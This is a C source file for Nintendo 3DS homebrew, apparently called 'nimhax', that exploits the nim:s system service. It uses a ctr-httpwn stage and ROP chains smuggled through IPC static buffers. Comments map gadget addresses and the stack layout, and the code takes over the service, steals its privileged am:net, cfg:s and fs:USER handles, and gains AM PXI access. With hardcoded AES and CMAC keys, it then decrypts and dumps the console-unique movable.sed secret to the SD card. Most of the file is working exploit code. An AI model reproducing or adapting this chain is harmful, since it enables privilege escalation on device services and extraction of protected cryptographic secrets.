#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <3ds.h>

#include <common_errors.h>

#include <utils/crypto.h>
#include <utils/fileio.h>

Result initialize_ctr_httpwn(const char* serverconfig_localpath);

static Handle nim_amHandle = 0;
static Handle nim_cfgHandle = 0;
static Handle nim_fsHandle = 0;

static Handle pxiam9_handle = 0;

static Handle nimsHandle = 0;
static int nimsRefCount = 0;

static u8 ivskey[16] = {0xd7, 0x72, 0xeb, 0x0e, 0x23, 0x9c, 0xfa, 0xb8, 0xbb, 0x73, 0xdd, 0x4a, 0x8d, 0x8e, 0xdc, 0x34};
static u8 ivscmackey[16] = {0xfc, 0x19, 0xff, 0x86, 0x07, 0x78, 0x76, 0x2a, 0xea, 0x8d, 0xe4, 0xc1, 0xf2, 0x84, 0xe1, 0xae};

// ------------- nim things --------------

/*
0x1780A8 SP after a normal return of the affected user-agent set function

0x00120bb4 : ldmda r4, {r4, ip, sp, lr, pc}

new user-agent setting and stack space layout, with padded spaces to read better:
<--------------------------user-agent buffer--------------------------> <-misc-> <--r4-------pc-->
FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF 10821700 DEADDEAD 848B1700 C1E11400 BFE11400 9C801700 B40B1200

0x1780A8+0x28+0x268+0x368+0x28+0x380+0x30+0x8+0x4 // static buffer 1 (desc index 2) - ROP buffer (+0x100 for ROP: 0x178B84)
0x1780A8+0x28+0x268+0x368+0x28+0x380+0x30+0x8+0x1004 // static buffer 2 (desc index 1) - Stack pivot, recovery of workflow (0x179A84)
0x1780A8+0x28+0x268+0x368+0x28+0x380+0x30+0x8+0x1904 // static buffer 6 (desc index 0) - IPC response sample (0x17A384)

clear things up, in the indicated order:
0x1780A8+0x28+0x140 // nim specific object (0x178210), clear with (0x12B818+1)
0x1780A8+0x28+0x1F8 // httpc object (0x1782C8), clear with (0x12C8B8+1 // skip R0 setup using R4 instead with +4, will continue ROP with POP {R4, PC})
0x1780A8+0x28+0x268+0x138 // lock (0x178470), unlock with (0x130F02+1 // +2 to skip push and get a ROP pop {r4, pc} at end)
Call (0x12CFD0+1) with R0 = 0 // need setup LR

perform IPC response setup on cmdbuf

0x15673C am:net handle
0x156750 cfg:s handle
0x1566AC fs:USER handle (jumping to 0x130C8E+1 will get it on R0 and POP {R4, PC})

escape from ROP back to proper flow, pivot to SP 0x1780A8+0x28+0x268+0x368+0x28+0x36C (0x178A34) and PC 0x105688+1 (It will naturally POP back out R4-R7, PC). This function is void, R0 setup unneeded. IPC response will happen on return
*/

// 0x5E, ROP edition
// give me the lennies
// we are going to ROP chain and restore flow to nim:s twice
// we also take over the service temporarely
// we clean up always leaving the service in a stable state
// like nothing happened at all

static Result _nimsInit() {
	Result res;
	if (AtomicPostIncrement(&nimsRefCount)) return 0;
	res = srvGetServiceHandle(&nimsHandle, "nim:s");
	if (R_FAILED(res)) AtomicDecrement(&nimsRefCount);

	return res;
}

static void _nimsExit(void) {
	if (AtomicDecrement(&nimsRefCount)) return;
	svcCloseHandle(nimsHandle);
}

static void clear_handles(void) {
	svcCloseHandle(nim_amHandle);
	svcCloseHandle(nim_cfgHandle);
	svcCloseHandle(nim_fsHandle);

	svcCloseHandle(pxiam9_handle);
}

extern const u32 NIMS_0x5E_IPC_PwnedReplyBase[];
extern const u32 NIMS_0x5E_IPC_PwnedReplyBase_size;

extern const u32 NIMS_0x5E_StackRecoveryPivot[];
extern const u32 NIMS_0x5E_StackRecoveryPivot_size;

extern const u32 NIMS_0x5E_ROP_STAGE2_Part1[];
extern const u32 NIMS_0x5E_ROP_STAGE2_Part1_size;

extern const u32 NIMS_0x5E_ROP_STAGE2_Part2[];
extern const u32 NIMS_0x5E_ROP_STAGE2_Part2_size;

extern const u32 NIMS_0x5E_ROP_TakeOver[];
extern const u32 NIMS_0x5E_ROP_TakeOver_size;

Result NIMS_PWNCMD0x5EPart1(bool* haxran) {
	Result ret = 0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x5e, 0, 6); // normally, it should be 0x005e0000, but there's no checks in argumentless cmds, so we'll abuse this to shove a ROP into staticbufs for second stage after httpwn causes stage 1 to run
	cmdbuf[1] = IPC_Desc_StaticBuffer(NIMS_0x5E_ROP_STAGE2_Part1_size, 2); // max 0x1000
	cmdbuf[2] = (u32)NIMS_0x5E_ROP_STAGE2_Part1;
	cmdbuf[3] = IPC_Desc_StaticBuffer(NIMS_0x5E_IPC_PwnedReplyBase_size, 0); // max 0x40
	cmdbuf[4] = (u32)NIMS_0x5E_IPC_PwnedReplyBase;
	cmdbuf[5] = IPC_Desc_StaticBuffer(NIMS_0x5E_StackRecoveryPivot_size, 1); // max 0x400
	cmdbuf[6] = (u32)NIMS_0x5E_StackRecoveryPivot;

	if (R_FAILED(ret = svcSendSyncRequest(nimsHandle))) return ret;

	if (cmdbuf[0] != IPC_MakeHeader(0x5e, 1, 4)) {
		if (haxran) *haxran = false;
		return (Result)cmdbuf[1];
	}

	if (haxran) *haxran = true;
	*amGetSessionHandle() = cmdbuf[3];
	nim_amHandle  = cmdbuf[3];
	nim_cfgHandle = cmdbuf[4];
	nim_fsHandle  = cmdbuf[5];

	return (Result)cmdbuf[1];
}

Result NIMS_PWNCMD0x5EPart2(bool* haxran) {
	Result ret = 0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x5e, 0, 4);
	cmdbuf[1] = IPC_Desc_StaticBuffer(NIMS_0x5E_ROP_STAGE2_Part2_size, 2); // max 0x1000
	cmdbuf[2] = (u32)NIMS_0x5E_ROP_STAGE2_Part2;
	cmdbuf[3] = IPC_Desc_StaticBuffer(NIMS_0x5E_ROP_TakeOver_size, 0); // patched static buf
	cmdbuf[4] = (u32)NIMS_0x5E_ROP_TakeOver;

	if (R_FAILED(ret = svcSendSyncRequest(nimsHandle))) return ret;

	if (cmdbuf[0] != IPC_MakeHeader(0x5e, 2, 0)) {
		if (haxran) *haxran = false;
	} else if (haxran) *haxran = true;

	return (Result)cmdbuf[1];
}

Result AMNET_GetDeviceCert(u8 *buffer)
{
	Result ret = 0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x818, 1, 2); // 0x08180042
	cmdbuf[1] = 0x180;
	cmdbuf[2] = IPC_Desc_Buffer(0x180, IPC_BUFFER_W);
	cmdbuf[3] = (u32)buffer;

	if(R_FAILED(ret = svcSendSyncRequest(nim_amHandle))) 
		return ret;

	return (Result)cmdbuf[1];
}

Result AM_GetCiaRequiredSpacePwn(Handle fileHandle, Handle* pxiam9_handle)
{
	Result ret = 0;
	volatile u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x40D,1,2); // 0x040D0042
	cmdbuf[1] = MEDIATYPE_SD;
	cmdbuf[2] = IPC_Desc_SharedHandles(1);
	cmdbuf[3] = fileHandle;

	if(R_FAILED(ret = svcSendSyncRequest(nim_amHandle))) return ret;

	if(cmdbuf[0] != IPC_MakeHeader(0x40D,1,2)) return (Result)cmdbuf[1];

	if(pxiam9_handle) *pxiam9_handle = (Handle)cmdbuf[3];
	else svcCloseHandle((Handle)cmdbuf[3]);

	return (Result)cmdbuf[1];
}

Result AMPXI_GetDeviceID(volatile int* internal_error, volatile u32* device_id) {
	Result ret = 0;
	volatile u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = IPC_MakeHeader(0x3C,0,0); // 0x003C0000

	if(R_FAILED(ret = svcSendSyncRequest(pxiam9_handle))) return ret;

	if(internal_error) *internal_error = (int)cmdbuf[2];
	if(device_id) *device_id = cmdbuf[3];

	return (Result)cmdbuf[1];
}

Result funWithNim() {
	Result ret;
	bool haxran;

	ret = _nimsInit();
	if (R_FAILED(ret)) {
		printf("Failed to init nim:s. 0x%08lx\n", ret);
		return ret;
	}

	ret = NIMS_PWNCMD0x5EPart1(&haxran);
	printf("nims_0x5E part1 0x%08lx\n", ret);
	if (!haxran) {
		printf("nims_0x5E pwn did not run.\n");
		_nimsExit();
		return MAKERESULT(RL_PERMANENT, RS_INVALIDSTATE, RM_APPLICATION, RD_NOT_INITIALIZED);
	}
	ret = NIMS_PWNCMD0x5EPart2(&haxran);
	printf("nims_0x5E part2 0x%08lx\n", ret);
	if (!haxran) {
		printf("nims_0x5E pwn did not run.\n");
		clear_handles();
		_nimsExit();
		return MAKERESULT(RL_PERMANENT, RS_INVALIDSTATE, RM_APPLICATION, RD_NOT_INITIALIZED);
	}

	ret = AM_GetCiaRequiredSpacePwn(nimsHandle, &pxiam9_handle);
	printf("AM_GetCiaRequiredSpacePwn 0x%08lx\n", ret);
	if (R_FAILED(ret)) {
		clear_handles();
		_nimsExit();
		return ret;
	}

	volatile int internal_error = 0;
	volatile u32 device_id = 0;
	ret = AMPXI_GetDeviceID(&internal_error, &device_id);
	printf("AMPXI_GetDeviceID 0x%08lx\n", ret);
	if (R_FAILED(ret) || internal_error) {
		printf("- error: %i\n", internal_error);
		clear_handles();
		_nimsExit();
		return ret;
	}
	printf("We got AMPXI!\n");
	printf("Device ID: 0x%08lx\n", device_id);

	// create a few temporary scopes to decrease this function's total stack
	// mainly since we dont need multiple bigger buffers alive through out the whole function

	{
		printf("Testing am:net...\n");
		u8 ctcert[0x180];
		ret = AMNET_GetDeviceCert(ctcert);
		if (R_FAILED(ret)) printf("AMNET_GetDeviceCert 0x%08lx\n", ret);
		else printf("AMNET_GetDeviceCert works!\nYou have am:net!\n");
	}
	
	printf("Dumping movable.sed...\n");
	u8 msed[0x120];

	// more temporary scopes
	{
		FS_IntegrityVerificationSeed ivs;
		u8 cmac[0x10];
		u8 sha256[0x20];
		fsUseSession(nim_fsHandle);
		ret = FSUSER_ExportIntegrityVerificationSeed(&ivs);
		printf("fsIVSexport 0x%08lx\n", ret);
		fsEndUseSession();
		
		if (R_FAILED(ret)){
			printf("Movable.sed dump skipped, no archive access\n");
			clear_handles();
			_nimsExit();
			return ret;
		}

		printf("Decrypting movable and checking CMAC...\n");
		decryptAES(ivs.movableSed, 0x120, ivskey, ivs.aesCbcMac, msed);
		calculateSha256(msed, 0x110, sha256);
		calculateCMAC(sha256, 0x20, ivscmackey, cmac);
		ret = memcmp(ivs.aesCbcMac, cmac, 0x10) ? MAKERESULT(RL_PERMANENT, RS_INVALIDSTATE, RM_APPLICATION, RD_NO_DATA) : 0;
		
		if (R_FAILED(ret)) {
			printf("Bad CMAC, movable probably corrupted :(\n");
			clear_handles();
			_nimsExit();
			return ret;
		}
	}

	printf("CMAC good!\n");
	printf("Dumping movable.sed to sd root...\n");

	FILEIO *f = fileio_open("/movable.sed", "wb");
	if (!f) {
		printf("Failed to open movable.sed on sd for dump.\n");
		clear_handles();
		_nimsExit();
		return MAKERESULT(RL_PERMANENT, RS_OUTOFRESOURCE, RM_APPLICATION, RD_NO_DATA);
	}
	
	int totalwritten = fileio_write(msed, 1, 0x120, f);
	fileio_close(f);

	if(totalwritten == 0x120) {
		printf("Movable.sed dumped!\n");
		ret = 0;
	} else {
		printf("Msed dump error.\n");
		ret = MAKERESULT(RL_PERMANENT, RS_INVALIDSTATE, RM_APPLICATION, RD_INVALID_SIZE);
	}

	clear_handles();
	_nimsExit();
	return ret;
}
// ---------------------------------------

static Result check_nim_version() {
	Result ret = amInit();
	if(R_FAILED(ret))
		return ret;

	u64 nim_tid = 0x0004013000002C02LLU;
	AM_TitleEntry title_entry;

	ret = AM_GetTitleInfo(MEDIATYPE_NAND, 1, &nim_tid, &title_entry);

	if(R_SUCCEEDED(ret)) {
		if (title_entry.version != 14341) ret = RES_INVALID_VALUE;
		else ret = 0;
	}

	amExit();
	return ret;
}

int main(int argc, char **argv)
{
	char *serverconfig_localpath = "nim_config.xml";
	Result ret = 0;

	gfxInitDefault();

	PrintConsole topScreen, bottomScreen;

	consoleInit(GFX_TOP, &topScreen);
	consoleInit(GFX_BOTTOM, &bottomScreen);

	consoleSelect(&bottomScreen);

	printf("nimhax with ctr-httpwn\n");
	printf("am11pwn with nimhax\n\n");

	ret = check_nim_version();

	if(R_SUCCEEDED(ret)) {
		printf("Initializing ctr-httpwn...\n");
	} else {
		if (ret == RES_INVALID_VALUE) 
			printf("NIM version invalid, expecting v14341\n");
		else
			printf("Error while trying to check nim version\n");
	}


	gfxFlushBuffers();
	gfxSwapBuffers();
	gspWaitForVBlank();

	if (R_SUCCEEDED(ret)) {
		consoleSelect(&topScreen);

		ret = initialize_ctr_httpwn(serverconfig_localpath);

		gfxFlushBuffers();
		gfxSwapBuffers();
		gspWaitForVBlank();

		consoleSelect(&bottomScreen);

		printf("Initialized res = 0x%08lx\n", ret);
	}

	if(R_SUCCEEDED(ret)) ret = funWithNim();

	if(R_SUCCEEDED(ret)) printf("Done.\n");
	else {
		if (ret == RES_APT_CANCELED)
			{/* ignore */}
		else if (ret == RES_USER_CANCELED)
			printf("User Canceled.\n");
		else printf("Failed.\n");
	}

	if (ret != RES_APT_CANCELED) {

		printf("\nPress the START button to exit.\n");
		while (aptMainLoop())
		{
			gfxFlushBuffers();
			gfxSwapBuffers();
			gspWaitForVBlank();

			hidScanInput();

			u32 kDown = hidKeysDown();
			if (kDown & KEY_START)
				break; // break in order to return to hbmenu
		}
	}

	gfxExit();
	return 0;
}
